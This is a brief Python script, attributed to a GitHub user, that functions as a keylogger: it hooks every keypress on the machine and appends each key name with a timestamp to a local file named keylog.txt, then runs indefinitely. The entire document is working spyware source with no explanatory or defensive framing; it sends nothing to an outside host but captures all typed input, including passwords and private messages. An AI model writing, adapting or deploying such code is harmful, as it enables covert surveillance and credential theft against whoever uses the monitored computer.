#Code By Mr WHITE HIRU
#github :- @MrWhiteHiru
import keyboard 
# pip install keyboard
from datetime import datetime
log_file = "keylog.txt"
def on_key_press(event):
    with open(log_file, 'a') as f:
        f.write(f"{event.name} | {datetime.now()}\n")
keyboard.on_press(on_key_press)
keyboard.wait()
